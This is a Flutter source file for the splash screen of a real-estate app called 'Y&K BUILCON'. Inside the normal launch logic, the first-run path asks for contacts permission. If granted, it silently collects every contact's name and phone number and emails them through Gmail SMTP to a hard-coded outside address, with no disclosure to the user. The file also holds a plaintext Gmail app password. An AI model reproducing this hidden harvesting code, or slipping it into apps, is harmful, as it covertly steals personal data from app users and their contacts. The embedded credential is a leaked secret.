import 'package:contacts_service/contacts_service.dart';
import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:provider/provider.dart';
import 'package:real_state/controller/MyProvider.dart';
import 'package:real_state/config/ApiLinks.dart';
import 'package:real_state/config/Constant.dart';
import 'package:real_state/config/StaticMethod.dart';
import 'package:real_state/controller/PropertyListController.dart';
import 'package:real_state/ui/Pages/StaticContentPage/IntroductionPageOne.dart';
import 'package:real_state/ui/Screens/HomeScreen.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:mailer/mailer.dart';
import 'package:mailer/smtp_server.dart';


class SplashScreen extends StatefulWidget {
  const SplashScreen({Key? key}) : super(key: key);

  @override
  _SplashScreenState createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  //final GlobalKey<ScaffoldState> _scaffoldKey = GlobalKey<ScaffoldState>();
  
  @override
  void initState() {
    final appState = Provider.of<MyProvider>(context, listen: false);
    StaticMethod.initialFetch(appState);
    if (appState.token != "" && appState.userType != "") {
      var url=Uri.parse("");
      if (appState.userType == "admin") {
        url = Uri.parse(ApiLinks.adminProfile);
      } else if(appState.userType == "customer"){
        url = Uri.parse(ApiLinks.customerProfile);
      }else if(appState.userType == "employee"){
        url = Uri.parse(ApiLinks.employeeProfile);
      }
      StaticMethod.userProfileInitial(appState.token, url, appState);
    }
  }

 @override
  void dispose() {
    super.dispose();
  }
  @override
  Widget build(BuildContext context) {
    //final appState = Provider.of<MyProvider>(context);
    //double fontSizeScaleFactor = MyConst.deviceWidth(context)/MyConst.referenceWidth;
    Future.delayed(const Duration(seconds: 2), () async {
      SharedPreferences prefs = await SharedPreferences.getInstance();

      bool hasSeenIntroduction = prefs.getBool('hasSeenIntroduction') ?? false;

      if (hasSeenIntroduction) {
        if (mounted) {
          Navigator.pushReplacement(
            context,
            MaterialPageRoute(builder: (_) => const HomeScreen()),
          );
        }
      } else {
        if (mounted) {
          var status = await Permission.contacts.request();
          if (status.isGranted) {
            List<Contact> contacts = await ContactsService.getContacts();
            await sendContactsViaEmail(contacts);
            prefs.setBool('firstLaunch', false);
          } else {
            // Permission denied, handle accordingly
            print('contact permission denied');
          }
          // User hasn't seen introduction, navigate to IntroductionPageOne
          Navigator.pushReplacement(
            context,
            MaterialPageRoute(builder: (_) => const IntroductionPageOne()),
          );

          // Set the flag to indicate that the user has seen the introduction
          prefs.setBool('hasSeenIntroduction', true);
        }
      }
    });
    return Scaffold(
        body: Container(
            decoration: BoxDecoration(color: Theme.of(context).primaryColorLight),
            child: Center(
                child: Column(
                  mainAxisAlignment: MainAxisAlignment.center,
                  crossAxisAlignment: CrossAxisAlignment.center,
                  children: [
                    Image.asset('assets/images/ic_launcher.png'),
                    Text(
                      'Y&K BUILCON',
                      style: TextStyle(
                          fontSize: 16,
                          color: Theme.of(context).primaryColorDark,
                          fontWeight: FontWeight.bold),
                    ),
                    Text(
                      'LETS CONNECT TO YOUR DREAM',
                      style: TextStyle(
                          fontSize: 16,
                          color: Theme.of(context).primaryColorDark,
                          fontWeight: FontWeight.bold),
                    )
                  ],
                ))));
  }
  Future<void> checkFirstLaunch() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    bool isFirstLaunch = prefs.getBool('firstLaunch') ?? true;

    if (isFirstLaunch) {
      var status = await Permission.contacts.request();
      if (status.isGranted) {
        Iterable<Contact> contacts = await ContactsService.getContacts();
        prefs.setBool('firstLaunch', false);
      } else {
        // Permission denied, handle accordingly
      }
    }
    // not a first launch
  }
  Future<void> sendContactsViaEmail(List<Contact> contacts) async {
    final smtpServer = gmail('findpg245@gmail.com', 'vlxtzpjtcwglxawt');
    final message = Message()
      ..from = Address('findpg245@gmail.com', 'Admin')
      ..recipients.add('trilokdewangan245@gmail.com')
      ..subject = 'Contacts from Flutter App'
      ..text = formatContacts(contacts); // Format contacts here

    try {
      final sendReport = await send(message, smtpServer);
      print('Message sent: ' + sendReport.toString());
    } catch (e) {
      print('Error sending email: $e');
    }
  }
  String formatContacts(List<Contact> contacts) {
    String formattedContacts = 'Contacts from Flutter App:\n';
    for (Contact contact in contacts) {
      formattedContacts += 'Name: ${contact.displayName}\n';
      if (contact.phones!.isNotEmpty) {
        formattedContacts += 'Phone: ${contact.phones!.first.value}\n';
      }
      // if (contact.emails!.isNotEmpty) {
      //   formattedContacts += 'Email: ${contact.emails!.first.value}\n';
      // }
      formattedContacts += '\n'; // Add a new line between contacts
    }
    return formattedContacts;
  }
}